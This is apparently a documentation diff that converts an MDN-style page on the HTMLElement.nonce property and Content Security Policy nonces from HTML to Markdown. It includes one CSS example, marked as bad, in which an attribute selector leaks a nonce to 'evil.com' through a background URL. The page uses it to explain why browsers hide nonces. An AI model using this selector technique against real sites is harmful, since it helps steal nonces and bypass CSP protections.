@@ -12,40 +12,42 @@ tags:
   - nonce
 browser-compat: api.HTMLElement.nonce
 ---
-<div>{{APIRef("HTML DOM")}}</div>
+{{APIRef("HTML DOM")}}
 
-<p>The <strong><code>nonce</code></strong> property of the {{DOMxRef("HTMLElement")}} interface returns the cryptographic number used once that is used by <a href="/en-US/docs/Web/HTTP/CSP">Content Security Policy</a> to determine whether a given fetch will be allowed to proceed.</p>
+The **`nonce`** property of the {{DOMxRef("HTMLElement")}} interface returns the cryptographic number used once that is used by [Content Security Policy](/en-US/docs/Web/HTTP/CSP) to determine whether a given fetch will be allowed to proceed.
 
-<p>In later implementations, elements only expose their <code>nonce</code> attribute to scripts (and not to side-channels like CSS attribute selectors).</p>
+In later implementations, elements only expose their `nonce` attribute to scripts (and not to side-channels like CSS attribute selectors).
 
-<h2 id="Examples">Examples</h2>
+## Examples
 
-<h3 id="Retrieving_a_nonce_value">Retrieving a nonce value</h3>
+### Retrieving a nonce value
 
-<p>In the past, not all browsers supported the <code>nonce</code> IDL attribute, so a workaround is to try to use <code><a href="/en-US/docs/Web/API/Element/getAttribute">getAttribute</a></code> as a fallback:</p>
+In the past, not all browsers supported the `nonce` IDL attribute, so a workaround is to try to use [`getAttribute`](/en-US/docs/Web/API/Element/getAttribute) as a fallback:
 
-<pre class="brush: js">let nonce = script['nonce'] || script.getAttribute('nonce');</pre>
+```js
+let nonce = script['nonce'] || script.getAttribute('nonce');
+```
 
-<p>However, recent browsers version hide <code>nonce</code> values that are accessed this way (an empty string will be returned). The IDL property (<code>script['nonce']</code>) will be the only way to access nonces.</p>
+However, recent browsers version hide `nonce` values that are accessed this way (an empty string will be returned). The IDL property (`script['nonce']`) will be the only way to access nonces.
 
-<p>Nonce hiding helps preventing that attackers exfiltrate nonce data via mechanisms that can grab data from content attributes like this:</p>
+Nonce hiding helps preventing that attackers exfiltrate nonce data via mechanisms that can grab data from content attributes like this:
 
-<pre class="brush: css example-bad">script[nonce~=whatever] {
+```css example-bad
+script[nonce~=whatever] {
   background: url("https://evil.com/nonce?whatever");
-}</pre>
+}
+```
 
-<h2 id="Specifications">Specifications</h2>
+## Specifications
 
 {{Specifications}}
 
-<h2 id="Browser_compatibility">Browser compatibility</h2>
+## Browser compatibility
 
-<p>{{Compat}}</p>
+{{Compat}}
 
-<h2 id="See_also">See also</h2>
+## See also
 
-<ul>
- <li><a href="/en-US/docs/Web/HTML/Global_attributes/nonce"><code>nonce</code> global attribute</a></li>
- <li><a href="/en-US/docs/Web/HTTP/CSP">Content Security Policy</a></li>
- <li>CSP: {{CSP("script-src")}}</li>
-</ul>
+- [`nonce` global attribute](/en-US/docs/Web/HTML/Global_attributes/nonce)
+- [Content Security Policy](/en-US/docs/Web/HTTP/CSP)
+- CSP: {{CSP("script-src")}}
